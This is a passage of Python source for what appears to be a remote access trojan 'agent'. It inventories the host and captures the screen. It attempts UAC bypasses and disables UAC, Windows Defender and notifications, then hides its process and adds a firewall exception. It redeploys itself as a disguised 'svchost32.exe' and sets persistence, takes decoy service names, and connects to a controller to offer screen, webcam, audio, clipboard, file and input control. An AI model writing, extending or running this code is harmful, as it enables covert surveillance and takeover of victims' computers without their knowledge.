                        })
                    except Exception:
                        pass
                
                hardware['gpu'] = gpu_devices[:3]  # Limit to first 3 GPUs
            except Exception:
                pass
            
            # Network Information
            try:
                network_interfaces = []
                for name, addrs in psutil.net_if_addrs().items():
                    interface_info = {
                        'name': name,
                        'mac': '',
                        'ip': '',
                        'type': 'Ethernet'
                    }
                    
                    for addr in addrs:
                        if addr.family == psutil.AF_LINK:  # MAC address
                            interface_info['mac'] = addr.address
                        elif addr.family == socket.AF_INET:  # IPv4
                            interface_info['ip'] = addr.address
                    
                    # Determine interface type
                    if 'wlan' in name.lower() or 'wifi' in name.lower():
                        interface_info['type'] = 'WiFi'
                    elif 'eth' in name.lower():
                        interface_info['type'] = 'Ethernet'
                    elif 'bluetooth' in name.lower():
                        interface_info['type'] = 'Bluetooth'
                    else:
                        interface_info['type'] = 'Unknown'
                    
                    network_interfaces.append(interface_info)
                
                hardware['network'] = network_interfaces[:5]  # Limit to first 5 interfaces
            except Exception:
                pass
            
            # Peripherals Information
            try:
                peripherals = []
                
                # Get USB devices on Windows
                if platform.system() == 'Windows':
                    try:
                        result = subprocess.run(['wmic', 'path', 'win32_PnPEntity', 'get', 'Name,Manufacturer,PNPDeviceID', '/format:list'], 
                                              capture_output=True, text=True, timeout=10)
                        current_device = {}
                        for line in result.stdout.split('\n'):
                            if '=' in line:
                                key, value = line.split('=', 1)
                                if 'Name' in key and value.strip():
                                    if current_device:
                                        peripherals.append(current_device)
                                    current_device = {
                                        'name': value.strip(),
                                        'type': 'Unknown',
                                        'vendor': 'Unknown',
                                        'connected': True
                                    }
                                elif 'Manufacturer' in key and value.strip():
                                    current_device['vendor'] = value.strip()
                                elif 'PNPDeviceID' in key and value.strip():
                                    # Try to determine device type from PNP ID
                                    pnp_id = value.strip().upper()
                                    if 'USB' in pnp_id:
                                        current_device['type'] = 'USB Device'
                                    elif 'AUDIO' in pnp_id:
                                        current_device['type'] = 'Audio Device'
                                    elif 'KEYBOARD' in pnp_id:
                                        current_device['type'] = 'Keyboard'
                                    elif 'MOUSE' in pnp_id:
                                        current_device['type'] = 'Mouse'
                                    elif 'CAMERA' in pnp_id or 'IMAGE' in pnp_id:
                                        current_device['type'] = 'Camera'
                                    elif 'STORAGE' in pnp_id:
                                        current_device['type'] = 'Storage Device'
                        
                        if current_device:
                            peripherals.append(current_device)
                    except Exception:
                        pass
                
                # Add common peripherals if none found
                if not peripherals:
                    common_peripherals = [
                        {'name': 'Standard Keyboard', 'type': 'Keyboard', 'vendor': 'Generic', 'connected': True},
                        {'name': 'Standard Mouse', 'type': 'Mouse', 'vendor': 'Generic', 'connected': True},
                        {'name': 'System Speakers', 'type': 'Audio Device', 'vendor': 'Generic', 'connected': True}
                    ]
                    peripherals.extend(common_peripherals)
                
                hardware['peripherals'] = peripherals[:10]  # Limit to first 10 peripherals
            except Exception:
                pass
            
            # Motherboard Information
            try:
                motherboard = {
                    'manufacturer': 'Unknown',
                    'model': 'Unknown',
                    'bios': 'Unknown'
                }
                
                # Get motherboard info on Windows
                if platform.system() == 'Windows':
                    try:
                        result = subprocess.run(['wmic', 'baseboard', 'get', 'Manufacturer,Product', '/format:list'], 
                                              capture_output=True, text=True, timeout=5)
                        for line in result.stdout.split('\n'):
                            if '=' in line:
                                key, value = line.split('=', 1)
                                if 'Manufacturer' in key and value.strip():
                                    motherboard['manufacturer'] = value.strip()
                                elif 'Product' in key and value.strip():
                                    motherboard['model'] = value.strip()
                        
                        # Get BIOS info
                        result = subprocess.run(['wmic', 'bios', 'get', 'Manufacturer,Version', '/format:list'], 
                                              capture_output=True, text=True, timeout=5)
                        for line in result.stdout.split('\n'):
                            if '=' in line:
                                key, value = line.split('=', 1)
                                if 'Manufacturer' in key and value.strip():
                                    motherboard['bios'] = value.strip()
                                elif 'Version' in key and value.strip():
                                    motherboard['bios'] += f" {value.strip()}"
                    except Exception:
                        pass
                
                hardware['motherboard'] = motherboard
            except Exception:
                pass
            
        except Exception as e:
            print(f"Error getting hardware inventory: {e}")
        
        return hardware

    def capture_screen_base64(self):
        """Capture screen using MSS as requested (file-based)."""
        try:
            import mss
            import mss.tools
            import base64
            import os
            
            # Output file path
            output_file = "full_desktop_ss.png"
            
            # Ensure clean state
            if os.path.exists(output_file):
                try:
                    os.remove(output_file)
                except Exception:
                    pass
            
            with mss.mss() as sct:
                monitor = sct.monitors[0]  # Full virtual screen
                screenshot = sct.grab(monitor)
                
                # Save to file as requested
                mss.tools.to_png(screenshot.rgb, screenshot.size, output=output_file)
            
            # Validation
            if not os.path.exists(output_file):
                raise Exception("Screenshot file was not created")
                
            file_size = os.path.getsize(output_file)
            if file_size < 100:  # Minimum valid PNG size
                raise Exception(f"Screenshot file too small: {file_size} bytes")
                
            # Read and encode
            with open(output_file, "rb") as f:
                png_bytes = f.read()
                
            base64_data = base64.b64encode(png_bytes).decode('utf-8')
            
            # Cleanup
            try:
                os.remove(output_file)
            except Exception:
                pass
                
            print(f"[Screenshot] Capture successful, size: {len(base64_data)}")
            return base64_data
            
        except Exception as e:
            print(f"[Screenshot] MSS capture failed: {e}")
            # Fallback to synthetic if MSS fails
            return self._capture_screen_synthetic()

    def _capture_screen_mss(self):
        """Capture screen using mss library."""
        try:
            if not MSS_AVAILABLE:
                raise Exception("mss module not available")
            
            import mss
            import mss.tools
            import base64
            
            with mss.mss() as sct:
                # Capture primary monitor (or all combined if supported, but simple is better for screenshot)
                # sct.monitors[0] is 'All in one'
                monitor = sct.monitors[0] if len(sct.monitors) > 0 else None
                if not monitor:
                     raise Exception("No monitors found")
                
                sct_img = sct.grab(monitor)
                
                # Convert to PNG bytes
                png_bytes = mss.tools.to_png(sct_img.rgb, sct_img.size)
                
                # Encode to base64
                base64_data = base64.b64encode(png_bytes).decode('utf-8')
                
                if not base64_data:
                    raise Exception("Base64 encoding failed")
                
                return base64_data
        except Exception as e:
            raise Exception(f"MSS capture failed: {str(e)}")

    def _capture_screen_synthetic(self):
        """Generate a synthetic screenshot for testing/fallback."""
        try:
            import cv2
            import numpy as np
            import base64
            import time
            
            width, height = 1280, 720
            img = np.zeros((height, width, 3), dtype=np.uint8)
            
            # Create a gradient background
            for y in range(height):
                r = int(255 * y / height)
                img[y, :, :] = (100, 50, r)
                
            # Add text
            font = cv2.FONT_HERSHEY_SIMPLEX
            cv2.putText(img, "SCREENSHOT CAPTURE FAILED", (100, 300), font, 2, (255, 255, 255), 4)
            cv2.putText(img, f"Agent: {self.agent_id}", (100, 400), font, 1, (200, 200, 200), 2)
            cv2.putText(img, f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}", (100, 450), font, 1, (200, 200, 200), 2)
            cv2.putText(img, "Using Synthetic Fallback", (100, 500), font, 1, (0, 255, 255), 2)
            
            # Encode
            _, buffer = cv2.imencode('.png', img)
            base64_data = base64.b64encode(buffer).decode('utf-8')
            return base64_data
        except Exception as e:
            # Absolute last resort: simple base64 1x1 pixel
            print(f"Synthetic generation failed: {e}")
            # 1x1 transparent pixel
            return "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=="
    
    def _capture_screen_fallback(self):
        """Screenshot capture fallback solution"""
        try:
            import pyautogui
            import io
            import base64
            
            print("[Screenshot] Using pyautogui fallback solution")
            
            # Validate pyautogui availability
            screen_size = pyautogui.size()
            if screen_size.width <= 0 or screen_size.height <= 0:
                raise Exception("Screen dimensions invalid")
            
            # Capture screen
            screenshot = pyautogui.screenshot()
            
            # Validate screenshot
            if not screenshot:
                raise Exception("pyautogui screenshot failed")
            
            # Convert to byte array
            img_byte_arr = io.BytesIO()
            screenshot.save(img_byte_arr, format='PNG')
            
            # Validate PNG data
            png_data = img_byte_arr.getvalue()
            if not png_data or len(png_data) == 0:
                raise Exception("PNG conversion failed")
            
            # Encode to base64
            base64_data = base64.b64encode(png_data).decode('utf-8')
            
            if not base64_data:
                raise Exception("Base64 encoding failed")
            
            return base64_data
            
        except ImportError as e:
            print(f"[Screenshot] pyautogui import failed: {e}")
            raise Exception("No screen capture library available (mss or pyautogui)")
        except Exception as e:
            print(f"[Screenshot] Fallback solution failed: {e}")
            raise Exception(f"Screen capture failed: {str(e)}")

def agent_main():
    """Main function for agent mode (original main functionality)."""
    global VERSION
    VERSION = "2.1"  # Define version for updater system
    
    log_message("=" * 60)
    log_message(f"Advanced Python Agent v{VERSION}")
    log_message("Starting up...")
    log_message("=" * 60)
    try:
        ensure_prerequisites()
    except Exception as e:
        log_message(f"[PREREQ] Error ensuring prerequisites: {e}", "warning")
    try:
        cleanup_startup_folder_artifacts()
    except Exception:
        pass
    # Initialize stealth enhancer hooks if available
    try:
        if STEALTH_AVAILABLE:
            try:
                hide_process()
            except Exception:
                pass
            try:
                add_firewall_exception()
            except Exception:
                pass
    except Exception as e:
        log_message(f"[STEALTH] Initialization error: {e}", "warning")
    
    # Check if running from stealth location
    current_path = sys.executable if hasattr(sys, 'executable') else os.path.abspath(__file__)
    stealth_path = os.path.join(
        os.environ.get('LOCALAPPDATA', ''),
        'Microsoft',
        'Windows',
        'svchost32.exe'
    )
    
    if current_path == stealth_path:
        log_message("[INFO] Running from stealth location")
    else:
        log_message("[INFO] Running from original location - will deploy to stealth location")
    
    # Check system requirements first
    requirements_ok = check_system_requirements()
    if not requirements_ok:
        log_message("Some critical requirements missing - functionality may be limited", "warning")
    
    # Initialize agent with error handling
    try:
        if WINDOWS_AVAILABLE:
            log_message("Running on Windows - initializing Windows-specific features...")
            
            # Check admin privileges
            if is_admin():
                log_message("[OK] Running with administrator privileges")
                # Setup advanced persistence if available
                try:
                    setup_advanced_persistence()
                except Exception as e:
                    log_message(f"[WARN] Could not setup advanced persistence: {e}")
            else:
                log_message("[INFO] Not running as administrator. Using basic persistence...")
                # Setup basic persistence
                try:
                    establish_persistence()
                except Exception as e:
                    log_message(f"[WARN] Could not setup persistence: {e}")
        else:
            log_message("Running on non-Windows system")
            # Setup Linux persistence
            try:
                establish_linux_persistence()
            except Exception as e:
                log_message(f"[WARN] Could not setup Linux persistence: {e}")
        
        # Setup startup (non-blocking)
        try:
            add_to_startup()
            # Verify registry persistence was established
            if WINDOWS_AVAILABLE:
                check_registry_persistence()
        except Exception as e:
            log_message(f"[WARN] Could not add to startup: {e}")
        
        # Auto self-deploy when running (only if not already deployed)
        global DEPLOYMENT_COMPLETED
        if not DEPLOYMENT_COMPLETED:
            try:
                log_message("Initiating automatic self-deployment...")
                if self_deploy_powershell():
                    log_message("Self-deployment completed successfully")
                    log_message("Agent will now run from stealth location on next login")
                else:
                    log_message("Self-deployment failed or was skipped", "warning")
            except Exception as e:
                log_message(f"Self-deployment failed: {e}", "warning")
        
        # Get or create agent ID
        agent_id = get_or_create_agent_id()
        log_message(f"[OK] Agent starting with ID: {agent_id}")
        
        # Update rollback manager with agent ID
        rollback_manager.update_agent_id(agent_id)
        
        # Update update logger with agent ID
        update_logger.update_agent_id(agent_id)
        
        # Initialize updater system
        if UPDATER_AVAILABLE:
            log_message("[INFO] Initializing updater system...")
            try:
                # Start file integrity monitoring
                test_file = "test_update_trigger.txt"
                if os.path.exists(test_file):
                    file_monitor.start_monitoring([test_file])
                    log_message(f"[OK] File monitoring started for test file: {test_file}")
                else:
                    file_monitor.start_monitoring([__file__])
                    log_message("[OK] File monitoring started for main script")
                
                # Test logging system
                update_logger.log_update_activity('agent_startup', {
                    'message': 'Agent started with updater system',
                    'agent_id': agent_id,
                    'version': VERSION
                })
                
                update_status_reporter.update_status('agent_startup', {
                    'agent_id': agent_id,
                    'version': VERSION,
                    'timestamp': time.time()
                })
                
                log_message("[OK] Updater system initialized successfully")
            except Exception as e:
                log_message(f"[WARN] Failed to initialize updater system: {e}", "warning")
        else:
            log_message("[WARN] Updater system not available", "warning")
        
        # Notify controller if running client-only
        try:
            notify_controller_client_only(agent_id)
        except Exception as e:
            log_message(f"Notify controller error: {e}", "warning")
        
        log_message("Initializing connection to server...")
        
        # Register Socket.IO event handlers ONCE before connection loop
        # This ensures handlers persist across all reconnections
        if sio is not None and SOCKETIO_AVAILABLE:
            log_message("Registering Socket.IO event handlers...")
            try:
                register_socketio_handlers()
                log_message("[OK] Socket.IO event handlers registered (will persist across reconnections)")
            except Exception as handler_error:
                log_message(f"[ERROR] Failed to register Socket.IO handlers: {handler_error}")
                log_message("Cannot continue without event handlers!")
                return
            
            # Start connection health monitor
            log_message("Starting connection health monitor...")
            health_monitor_thread = threading.Thread(target=connection_health_monitor, daemon=True, name="ConnectionHealthMonitor")
            health_monitor_thread.start()
            log_message("[OK] Connection health monitor started (checks every 1 second)")
        else:
            log_message("Socket.IO not available - running in offline mode", "warning")
            log_message("Agent running in offline mode - no server communication")
            try:
                while True:
                    time.sleep(60)  # Keep alive in offline mode
            except KeyboardInterrupt:
                log_message("Offline mode interrupted")
            return
        
        # Main connection loop with improved error handling
        connection_attempts = 0
        max_retry_delay = 60  # Maximum retry delay in seconds
        while True:
            try:
                connection_attempts += 1
                retry_delay = min(connection_attempts * 5, max_retry_delay)  # Progressive backoff
                
                log_message(f"Connecting to server at {SERVER_URL} (attempt {connection_attempts})...")
                
                # Test if controller is reachable first
                if REQUESTS_AVAILABLE:
                    try:
                        import requests
                        test_response = requests.get(SERVER_URL, timeout=5)
                        log_message(f"[OK] Controller is reachable (HTTP {test_response.status_code})")
                    except Exception as e:
                        log_message(f"[WARN] Controller may not be reachable: {e}")
                        log_message(f"[INFO] Will retry in {retry_delay} seconds...")
                        time.sleep(retry_delay)
                        continue
            
                try:
                    sync_admin_status_to_controller(agent_id)
                except Exception:
                    pass

                sio.connect(
                    SERVER_URL,
                    transports=['websocket', 'polling'],
                    wait_timeout=30
                )
                log_message("[OK] Connected to server successfully!")
                
                # Reset connection attempts and state on successful connection
                connection_attempts = 0
                CONNECTION_STATE['connected'] = True
                CONNECTION_STATE['consecutive_failures'] = 0
                CONNECTION_STATE['reconnect_needed'] = False
                CONNECTION_STATE['force_reconnect'] = False
                
                # Email notify once when agent comes online
                global EMAIL_SENT_ONLINE
                if not EMAIL_SENT_ONLINE:
                    subject = f"Agent Online: {agent_id}"
                    body = (
                        f"An agent just connected.\n\n"
                        f"Agent ID: {agent_id}\n"
                        f"Host: {platform.node()}\n"
                        f"Platform: {platform.system()} {platform.release()}\n"
                        f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
                        f"Server URL: {SERVER_URL}\n"
                    )
                    if send_email_notification(subject, body):
                        EMAIL_SENT_ONLINE = True
                        log_message("Email notification sent: agent online")
                
                # Handlers are already registered - no need to register again
                log_message("[INFO] Event handlers already registered and active")
                
                # Manually register agent with controller
                try:
                    log_message(f"[INFO] Registering agent {agent_id} with controller...")
                    
                    # [ OK ] SAFE EMIT: Critical registration path
                    if not safe_emit('agent_connect', {
        'agent_id': agent_id,
        'alias': (read_local_alias() or None),
        'hostname': socket.gethostname(),
        'platform': platform.system(),
        'os_version': platform.release(),
        'ip_address': get_local_ip(),
        'public_ip': get_public_ip(),
        'username': os.getenv('USERNAME') or os.getenv('USER') or 'unknown',
        'version': '2.1',
        'is_admin': bool(is_admin()),
        'capabilities': {
            'screen': True,
            'camera': CV2_AVAILABLE,
            'audio': PYAUDIO_AVAILABLE,
            'clipboard': True,
            'file_manager': True,
            'process_manager': PSUTIL_AVAILABLE,
            'webcam': CV2_AVAILABLE,
            'webrtc': AIORTC_AVAILABLE
        },
        'timestamp': int(time.time() * 1000)
    }):
                        log_message(f"[ERROR] Failed to send agent registration - connection issue", "error")
                    else:
                        log_message(f"[OK] Agent {agent_id} registration sent to controller")
                    
                    # Send system info to controller
                    system_info = {
                        'agent_id': agent_id,
                        'platform': platform.system(),
                        'hostname': platform.node(),
                        'python_version': platform.python_version(),
                        'capabilities': {
                            'screen_capture': MSS_AVAILABLE,
                            'camera': CV2_AVAILABLE,
                            'audio': PYAUDIO_AVAILABLE,
                            'input_control': PYNPUT_AVAILABLE,
                            'webrtc': AIORTC_AVAILABLE
                        }
                    }
                    
                    # [ OK ] SAFE EMIT: Critical system info
                    if not safe_emit('agent_info', system_info):
                        log_message(f"[ERROR] Failed to send system info - connection issue", "error")
                    else:
                        log_message(f"[OK] Agent system info sent to controller")
                    
                except Exception as reg_error:
                    log_message(f"[WARN] Failed to register agent: {reg_error}")
                
                try:
                    start_heartbeat()
                except Exception:
                    pass
                
                # Keep connection alive and wait for events
                sio.wait()
                
            except socketio.exceptions.ConnectionError as conn_err:
                retry_delay = min(connection_attempts * 5, max_retry_delay)
                log_message(f"[WARN] Connection failed (attempt {connection_attempts}): {conn_err}")
                log_message(f"[INFO] Retrying in {retry_delay} seconds...")
                
                # Update connection state
                CONNECTION_STATE['connected'] = False
                CONNECTION_STATE['consecutive_failures'] += 1
                
                # Stop all operations before retrying
                try:
                    stop_all_operations()
                except:
                    pass
                
                time.sleep(retry_delay)
            except KeyboardInterrupt:
                log_message("\n[INFO] Received interrupt signal. Shutting down gracefully...")
                break
            except Exception as e:
                log_message(f"[ERROR] An unexpected error occurred: {e}")
                # Cleanup resources
                try:
                    stop_streaming()
                    stop_audio_streaming()
                    stop_camera_streaming()
                    log_message("[OK] Cleaned up resources.")
                except Exception as cleanup_error:
                    log_message(f"[WARN] Error during cleanup: {cleanup_error}")
                
                log_message("Retrying in 10 seconds...")
                time.sleep(10)
    
    except KeyboardInterrupt:
        log_message("\n[INFO] Agent shutdown requested.")
    except Exception as e:
        log_message(f"[ERROR] Critical error during startup: {e}")
    finally:
        log_message("[INFO] Agent shutting down.")
        try:
            if sio and hasattr(sio, 'connected') and sio.connected:
                sio.disconnect()
        except:
            pass

def signal_handler(signum, frame):
    """Handle shutdown signals gracefully."""
    log_message("\nAgent shutting down.")
    try:
        # Stop all streaming and monitoring
        try:
            stop_streaming()
        except Exception as e:
            log_message(f"Error stopping streaming: {e}")
        
        try:
            stop_audio_streaming()
        except Exception as e:
            log_message(f"Error stopping audio streaming: {e}")
        
        try:
            stop_camera_streaming()
        except Exception as e:
            log_message(f"Error stopping camera streaming: {e}")
        
        
        
        try:
            stop_clipboard_monitor()
        except Exception as e:
            log_message(f"Error stopping clipboard monitor: {e}")
        
        try:
            if 'low_latency_input' in globals() and low_latency_input:
                low_latency_input.stop()
        except Exception as e:
            log_message(f"Error stopping low latency input: {e}")
        
        # Disconnect from server
        if SOCKETIO_AVAILABLE and 'sio' in globals() and sio is not None:
            try:
                if sio.connected:
                    sio.disconnect()
            except Exception as e:
                log_message(f"Error disconnecting from server: {e}")
        
        log_message("Cleanup complete.")
    except Exception as e:
        log_message(f"Error during cleanup: {e}")
    
    sys.exit(0)

if __name__ == "__main__":
    # Support for PyInstaller multiprocessing on Windows
    try:
        import multiprocessing
        multiprocessing.freeze_support()
    except ImportError:
        pass

    # Check if we're being imported by an elevated script (prevents recursive execution)
    if os.environ.get('ELEVATED_MODE') == '1':
        # We're in elevated mode - don't run main startup, just provide functions
        print("[ELEVATED] Script loaded in elevated mode - functions available for import")
        # DO NOT run the full startup sequence - the elevated script will import and call specific functions
        # Exit immediately to prevent recursive execution
        sys.exit(0)
    
    # FIRST EXECUTION: Aggressive path to ensure admin, then apply registry import
    if WINDOWS_AVAILABLE:
        try:
            print("=" * 80)
            print("[STARTUP] FIRST ACTION: Acquire admin and apply UAC registry disable (HKLM)")
            print("=" * 80)
            # If not admin, try bypass first
            if not is_admin():
                print("[STARTUP] Not admin - attempting aggressive UAC bypass...")
                bypass_ok = False
                try:
                    bypass_ok = attempt_uac_bypass()
                except Exception as e:
                    print(f"[STARTUP] UAC bypass error: {e}")
                # If bypass launched elevated instance, exit this one to let it take over
                if bypass_ok and not is_admin() and not KEEP_ORIGINAL_PROCESS:
                    print("[STARTUP] Elevated instance launched - exiting original process")
                    time.sleep(1)
                    sys.exit(0)
                # If still not admin after bypass, fall back to UAC prompt
                if not is_admin():
                    print("[STARTUP] Falling back to UAC prompt (runas)...")
                    try:
                        run_as_admin_with_limited_attempts()
                    except Exception as e:
                        print(f"[STARTUP] UAC prompt error: {e}")
            # Apply registry import only if admin
            if is_admin():
                print("[STARTUP] Applying UAC registry import (HKLM Policies\\System)")
                result_first = False
                try:
                    result_first = silent_disable_uac_method4()
                except Exception as e:
                    print(f"[STARTUP] UAC registry import error: {e}")
                if result_first:
                    print("[STARTUP] [ OK ] UAC registry import applied")
                else:
                    print("[STARTUP] [ ! ] UAC registry import failed (check permissions)")
            else:
                print("[STARTUP] [ X ] Still not admin - registry import skipped")
            print("=" * 80)
        except Exception as e:
            print(f"[STARTUP] Unexpected error in first action: {e}")
    
    # RED TEAM MODE: AGGRESSIVE UAC BYPASS AT STARTUP
    # Use fodhelper.exe to automatically elevate to admin BEFORE Defender can block
    if False:
        print("=" * 80)
        print("[RED TEAM] [!] AGGRESSIVE UAC BYPASS INITIATED")
        print("[RED TEAM] Using fodhelper.exe to auto-elevate to admin privileges")
        print("[RED TEAM] This prevents Windows Defender from blocking execution!")
        print("=" * 80)
        
        try:
            # Use the existing fodhelper bypass to elevate immediately
            if bypass_uac_fodhelper_protocol():
                print("[RED TEAM] [ OK ] UAC bypass initiated via fodhelper.exe")
                print("[RED TEAM] [...] Waiting for elevation to complete...")
                
                # Wait a moment for the elevation to take effect
                time.sleep(3)
                
                # Check if we're now admin
                if is_admin():
                    print("[RED TEAM] [ OK ][ OK ][ OK ] SUCCESSFULLY ELEVATED TO ADMIN!")
                    print("[RED TEAM] Windows Defender can no longer block execution!")
                else:
                    print("[RED TEAM] [ ! ] UAC bypass initiated but not yet elevated")
                    print("[RED TEAM] Continuing with standard startup...")
            else:
                print("[RED TEAM] [ ! ] Fodhelper bypass failed - continuing normally")
                
        except Exception as e:
            print(f"[RED TEAM] [ X ] UAC bypass error: {e}")
            print("[RED TEAM] Continuing with standard startup...")
        
        print("=" * 80)
    
    # Normal startup mode - proceed with full startup
    # Add startup banner before anything else
    print("[STARTUP] Python Agent Starting...")
    print("[STARTUP] Initializing components...")
    
    # PRIORITY 0: Check Administrator Privileges
    if WINDOWS_AVAILABLE:
        print("=" * 80)
        print("[STARTUP] PRIORITY 0: Checking Administrator Privileges...")
        print("=" * 80)
        
        if is_admin():
            print("[STARTUP] [OK] Already running as Administrator")
        else:
            print("[STARTUP] [-] Running as Standard User")
        
        print("=" * 80)
    
    # PRIORITY 1: Disable WSL, UAC, Defender, and Notifications FIRST
    try:
        print("[STARTUP] === SYSTEM CONFIGURATION STARTING ===")
        print("[STARTUP] Using SILENT methods (no popups, no user interaction)")
        print("=" * 80)
        
        # 0. Disable WSL routing FIRST (fixes command execution!)
        print("[STARTUP] Step 0: Disabling WSL routing (AGGRESSIVE)...")
        try:
            if disable_wsl_routing():
                print("[STARTUP] [OK] WSL routing disabled - commands will use PowerShell directly")
            else:
                print("[STARTUP] [!] WSL routing disable failed (not critical)")
        except Exception as e:
            print(f"[STARTUP] WSL routing error: {e}")
        
        if not DISABLE_UAC_BYPASS:
            print("\n[STARTUP] Step 1: AGGRESSIVE ADMIN ACQUISITION (RED TEAM MODE)...")
            print("[STARTUP] ENSURING ADMIN PRIVILEGES BEFORE SECURITY DISABLE!")
            print("[STARTUP] Using multiple UAC bypass techniques for maximum reliability!")
            
            admin_acquired = False
            max_attempts = 3
            
            for attempt in range(max_attempts):
                print(f"[STARTUP] Admin acquisition attempt {attempt + 1}/{max_attempts}...")
                
                if is_admin():
                    print("[STARTUP] [OK] Already running as Administrator")
                    admin_acquired = True
                    break
                    
                try:
                    if bootstrap_uac_disable_no_admin():
                        print("[STARTUP] [OK] ADMIN PRIVILEGES ACQUIRED SUCCESSFULLY!")
                        print("[STARTUP] [OK] Used UAC bypass - NO ADMIN PASSWORD NEEDED!")
                        admin_acquired = True
                        break
                    else:
                        print(f"[STARTUP] [!] UAC bypass attempt {attempt + 1} failed")
                        time.sleep(2)
                        
                except Exception as e:
                    print(f"[STARTUP] UAC bypass error: {e}")
                    time.sleep(2)
            
            if not admin_acquired:
                print("[STARTUP] [X] CRITICAL: Could not acquire admin privileges!")
                print("[STARTUP] [!] Security feature disable may be limited without admin rights")
                print("[STARTUP] [i] Agent will continue but some protections may remain active")
            else:
                print("[STARTUP] [OK] ADMIN PRIVILEGES SECURED - PROCEEDING WITH SECURITY DISABLE")
        
        # Verify current admin status
        current_admin = is_admin()
        print(f"[STARTUP] Current admin status: {'[OK] ADMIN' if current_admin else '[X] STANDARD USER'}")
        
        # 2. Disable Windows Defender
        if DEFENDER_DISABLE_ENABLED:
            print("\n[STARTUP] Step 2: Disabling Windows Defender...")
            try:
                if disable_defender():
                    print("[STARTUP] [OK] Windows Defender disabled successfully")
                else:
                    print("[STARTUP] [i] Defender disable failed - will retry in background")
            except Exception as e:
                print(f"[STARTUP] [i] Defender disable error (non-critical): {e}")
        
        # 3. Disable Windows notifications
        print("\n[STARTUP] Step 3: Disabling Windows notifications...")
        try:
            if REGISTRY_ENABLED and disable_windows_notifications():
                print("[STARTUP] [OK] Notifications disabled successfully")
            else:
                print("[STARTUP] [i] Notification disable failed - will retry in background")
        except Exception as e:
            print(f"[STARTUP] [i] Notification disable error (non-critical): {e}")
        
        print("\n" + "=" * 80)
        print("[STARTUP] === SYSTEM CONFIGURATION COMPLETE ===")
        print("=" * 80)
        
        # FINAL UAC STATUS CHECK
        print("\n[STARTUP] FINAL UAC STATUS CHECK:")
        try:
            verify_uac_status()
        except Exception as e:
            print(f"[STARTUP] Status check error: {e}")
        
        print("=" * 80)
        print("[STARTUP] [ ! ] IMPORTANT: RESTART REQUIRED for UAC changes to take full effect!")
        print("=" * 80)
        
    except Exception as e:
        print(f"[STARTUP] Configuration error: {e}")
        import traceback
        traceback.print_exc()
    
    # Initialize basic stealth mode
    try:
        sleep_random_non_blocking()  # Add random delay
    except Exception as e:
        log_message(f"[STEALTH] Stealth initialization failed: {e}")
    
    # Obfuscate startup messages (only if not in silent mode)
    if not SILENT_MODE:
        startup_messages = [
            "System Update Service",
            "Windows Security Service", 
            "Microsoft Update Service",
            "System Configuration Service",
            "Windows Management Service",
            "System Maintenance Service",
            "Windows Update Service",
            "System Optimization Service"
        ]
        
        service_name = random.choice(startup_messages)
        log_message("=" * 60)
        log_message(f"{service_name} v2.1")
        log_message("Initializing system components...")
        log_message("=" * 60)
        log_message("WebRTC Optimization Features:")
        log_message("  [OK] Bandwidth estimation & adaptive bitrate control")
        log_message("  [OK] Intelligent frame dropping under load")
        log_message("  [OK] Connection quality monitoring & auto-reconnection")
        log_message("  [OK] Production scale planning (mediasoup migration)")
        log_message("  [OK] Enhanced performance tuning & monitoring")
        log_message("=" * 60)
    
    # CRITICAL FIX: Call main() which contains the persistence logic
    print("[STARTUP] Calling main()...")
    try:
        main()
    except KeyboardInterrupt:
        print("System shutdown requested.")
    except ImportError as e:
        print(f"Missing dependency: {e}")
        print("Agent will continue with limited functionality")
        import traceback
        traceback.print_exc()
        # Continue running with basic functionality
        try:
            while True:
                time.sleep(60)
        except KeyboardInterrupt:
            print("Fallback mode interrupted")
    except Exception as e:
        print(f"System error: {e}")
        print("Full traceback:")
        import traceback
        traceback.print_exc()
        print("Attempting to recover and continue...")
        # Try to recover and continue
        time.sleep(5)
    finally:
        log_message("Shutting down system components.")
        try:
            if sio and hasattr(sio, 'connected') and sio.connected:
                sio.disconnect()
        except Exception as e:
            log_message(f"Error disconnecting socket: {e}", "error")
        
        # Clear sensitive memory and COM objects
        try:
            # Clean up COM objects if on Windows
            if WINDOWS_AVAILABLE:
                try:
                    import pythoncom
                    pythoncom.CoUninitialize()
                except Exception:
                    pass  # COM might not be initialized
            
            import gc
            gc.collect()
        except Exception as e:
            log_message(f"Error during cleanup: {e}", "error")

# Agent authentication removed - direct access enabled

# Modern non-blocking streaming pipeline for screen streaming
# Note: These variables are already defined in the global state section above
# STREAMING_ENABLED, TARGET_FPS, CAPTURE_QUEUE_SIZE, ENCODE_QUEUE_SIZE, STREAM_THREADS, capture_queue, encode_queue are defined globally


def screen_capture_worker(agent_id):
    global STREAMING_ENABLED, capture_queue, SELECTED_MONITOR_INDEX, DISPLAY_MODE, PIP_MONITOR_INDEX
    if not NUMPY_AVAILABLE or not CV2_AVAILABLE:
        log_message("Required modules not available for screen capture", "error")
        return
    try:
        hpc = HighPerformanceCapture(target_fps=TARGET_FPS, quality=85, enable_delta_compression=False)
        sct = None
        monitors = []
        if MSS_AVAILABLE:
            try:
                sct = mss.mss()
                monitors = sct.monitors
            except Exception:
                sct = None
                monitors = []
        monitor_index = SELECTED_MONITOR_INDEX if len(monitors) > 1 else 0
        monitor = monitors[monitor_index] if monitors else None
        if isinstance(monitor, dict):
            width = int(monitor.get('width', (monitor['right'] - monitor['left'])))
            height = int(monitor.get('height', (monitor['bottom'] - monitor['top'])))
            left = int(monitor.get('left', 0))
            top = int(monitor.get('top', 0))
            right = left + width
            bottom = top + height
        elif monitor:
            width = monitor[2] - monitor[0]
            height = monitor[3] - monitor[1]
            left = monitor[0]
            top = monitor[1]
            right = monitor[2]
            bottom = monitor[3]
        else:
            width = 1280
            height = 720
            left = 0
            top = 0
            right = width
            bottom = height
        if width > 1280:
            scale = 1280 / width
            width = int(width * scale)
            height = int(height * scale)
        frame_time = 1.0 / TARGET_FPS
        try:
            while STREAMING_ENABLED:
                try:
                    start = time.time()
                    if DISPLAY_MODE == 'combined' and len(monitors) > 1 and sct:
                        frames = []
                        for i in range(1, len(monitors)):
                            m = monitors[i]
                            s = sct.grab(m)
                            f = np.array(s)
                            if f.shape[2] == 4:
                                f = cv2.cvtColor(f, cv2.COLOR_BGRA2BGR)
                            frames.append(f)
                        if frames:
                            try:
                                img = np.hstack(frames)
                            except Exception:
                                img = frames[0]
